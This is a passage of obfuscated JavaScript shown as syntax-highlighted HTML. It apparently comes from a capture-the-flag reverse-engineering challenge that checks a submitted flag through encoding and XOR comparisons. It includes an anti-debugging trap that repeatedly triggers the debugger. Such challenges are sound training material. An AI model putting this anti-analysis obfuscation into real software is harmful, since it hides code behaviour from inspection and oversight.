                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">0x2</span> <span class="token operator">|</span> _0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">0x4</span> <span class="token operator">|</span> _0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">0x1</span> <span class="token operator">|</span> _0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">0x3</span> <span class="token operator">|</span> _0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1d&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3f9bc5<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1e1753 <span class="token operator">*</span> <span class="token number">0x5</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                var _0x545c12 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x4ee491 <span class="token operator">==</span> <span class="token number">0x1</span><span class="token punctuation">)</span> _0x545c12 <span class="token operator">=</span> <span class="token number">0x6</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x4ee491 <span class="token operator">==</span> <span class="token number">0x2</span><span class="token punctuation">)</span> _0x545c12 <span class="token operator">=</span> <span class="token number">0x4</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x4ee491 <span class="token operator">==</span> <span class="token number">0x3</span><span class="token punctuation">)</span> _0x545c12 <span class="token operator">=</span> <span class="token number">0x3</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x4ee491 <span class="token operator">==</span> <span class="token number">0x4</span><span class="token punctuation">)</span> _0x545c12 <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>_0x1e1753 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x1e1753 <span class="token operator">&lt;</span> _0x545c12<span class="token punctuation">;</span> _0x1e1753<span class="token operator">++</span><span class="token punctuation">)</span> _0x4dc510<span class="token punctuation">[</span>_0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x2f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>_0x1e1753 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x1e1753 <span class="token operator">&lt;</span> _0x545c12<span class="token punctuation">;</span> _0x1e1753<span class="token operator">++</span><span class="token punctuation">)</span> _0x4dc510<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;1b&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;=&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token punctuation">(</span>function _0x3c3bd8<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        try <span class="token punctuation">{</span>
                            <span class="token punctuation">(</span>function _0x4dc510<span class="token punctuation">(</span>_0x460a91<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&apos;&apos;</span> <span class="token operator">+</span> _0x460a91 <span class="token operator">/</span> _0x460a91<span class="token punctuation">)</span><span class="token punctuation">[</span>_0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x30&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">0x1</span> <span class="token operator">||</span> _0x460a91 <span class="token operator">%</span> <span class="token number">0x14</span> <span class="token operator">===</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                    <span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token string">&apos;constructor&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;debugger&apos;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                                    debugger<span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>
                                _0x4dc510<span class="token punctuation">(</span><span class="token operator">++</span>_0x460a91<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> catch <span class="token punctuation">(</span><span class="token class-name">_0x30f185</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            setTimeout<span class="token punctuation">(</span>_0x3c3bd8<span class="token punctuation">,</span> <span class="token number">0x1388</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> _0x4dc510<span class="token punctuation">[</span>_0xa180<span class="token punctuation">(</span><span class="token string">&apos;0x31&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            e <span class="token operator">=</span> _0x1c3854<span class="token punctuation">(</span>b2c<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;=&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x53a3f32</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> <span class="token number">0x4b7c0a73</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            f <span class="token operator">=</span> _0x1c3854<span class="token punctuation">(</span>b2c<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;=&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">!=</span> <span class="token number">0x4315332</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            n <span class="token operator">=</span> f <span class="token operator">*</span> e <span class="token operator">*</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            h <span class="token operator">=</span> function <span class="token punctuation">(</span>_0x4c466e<span class="token punctuation">,</span> _0x28871<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var _0x3ea581 <span class="token operator">=</span> <span class="token string">&apos;&apos;</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>var _0x2fbf7a <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x2fbf7a <span class="token operator">&lt;</span> _0x4c466e<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> _0x2fbf7a<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    _0x3ea581 <span class="token operator">+</span><span class="token operator">=</span> _0x28871<span class="token punctuation">(</span>_0x4c466e<span class="token punctuation">[</span>_0x2fbf7a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> _0x3ea581<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            j <span class="token operator">=</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;3&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> j<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_0x1c3854<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> _0x1c3854<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x1613</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            k <span class="token operator">=</span> _0xffcc52 <span class="token operator">=</span><span class="token operator">&gt;</span> _0xffcc52<span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            l <span class="token operator">=</span> h<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0x0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">!=</span> <span class="token number">0x2f9b5072</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            m <span class="token operator">=</span> _0x1c3854<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x48a05362</span> <span class="token operator">==</span> n <span class="token operator">%</span> l<span class="token punctuation">;</span>

            function _0x5a6d56<span class="token punctuation">(</span>_0x5a25ab<span class="token punctuation">,</span> _0x4a4483<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var _0x55b09f <span class="token operator">=</span> <span class="token string">&apos;&apos;</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>var _0x508ace <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x508ace <span class="token operator">&lt;</span> _0x4a4483<span class="token punctuation">;</span> _0x508ace<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    _0x55b09f <span class="token operator">+</span><span class="token operator">=</span> _0x5a25ab<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> _0x55b09f<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>m <span class="token operator">||</span> _0x5a6d56<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">||</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">-</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            o <span class="token operator">=</span> _0x1c3854<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token string">&apos;f&apos;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0x5</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> o <span class="token operator">&amp;&amp;</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x2</span> <span class="token operator">&amp;&amp;</span> _0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> _0x5a6d56<span class="token punctuation">(</span>_0x76e1e8<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_0x43c8d1<span class="token punctuation">(</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> catch <span class="token punctuation">(</span><span class="token class-name">_0x4cbb89</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">[</span><span class="token string">&apos;log&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&apos;gg&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
